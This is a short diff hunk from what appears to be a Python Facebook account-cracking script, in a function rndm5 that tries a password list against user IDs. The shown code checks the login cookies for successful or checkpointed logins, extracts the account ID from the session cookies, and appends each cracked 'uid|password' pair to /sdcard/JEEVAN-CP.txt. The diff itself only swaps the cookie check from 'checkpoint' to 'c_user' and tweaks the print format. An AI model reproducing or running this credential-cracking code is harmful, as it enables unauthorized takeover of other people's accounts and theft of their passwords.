@@ -1421,11 +1421,11 @@ def rndm5(uid,passlist):
                                         oks.append(uid)
                                         cek_apk(coki)
                                         return True
-                        elif 'checkpoint' in log_cookies:
+                        elif 'c_user' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                         coki1 = coki.split("1000")[1]
                                         uid = "1000"+coki1[0:11]
-                                        print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' || '+pas+'\033[1;97m')
                                         open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
                                         cps.append(uid)
                                         return True
